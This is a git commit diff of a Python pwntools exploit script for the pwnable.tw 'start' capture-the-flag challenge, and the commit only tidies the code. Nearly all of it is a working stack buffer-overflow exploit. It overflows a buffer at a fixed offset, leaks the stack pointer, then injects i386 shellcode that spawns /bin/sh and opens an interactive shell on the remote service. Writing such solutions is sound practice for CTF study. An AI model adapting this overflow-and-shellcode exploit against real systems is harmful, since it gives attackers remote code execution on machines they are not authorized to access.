bb4a5b37eca2d7fec3dfa188b5b767db7e1549eb
ovekiba <ovekiba@gmail.com>
2018-03-08 09:57:01 +0000

    update

--- Start/expolit.py
+++ Start/expolit.py
@@ -1,25 +1,24 @@
 #!/usr/bin/env python
-# coding=utf-8
 
 from pwn import *
+
+context.update(log_level='info', arch='i386', os='linux')
 
 #p = process('./start')
 p = remote('chall.pwnable.tw', 10000)
 
-p.recvuntil(':')
-
 ret = 0x08048087
 cyclic_offset = 20
 
-p.send(fit({
+p.sendafter(':', (fit({
     cyclic_offset: p32(ret)
-    }))
+    })))
 
 esp = u32(p.recv(1024)[:4])
-log.info("Esp: %s" % hex(esp))
+log.success('esp: ' + hex(esp))
 
 p.send(fit({
-    cyclic_offset: [p32(esp + 20), asm(shellcraft.i386.linux.execve('/bin/sh'))]
+    cyclic_offset: [p32(esp + 20), asm(shellcraft.execve('/bin/sh'))]
     }))
 
 p.interactive()
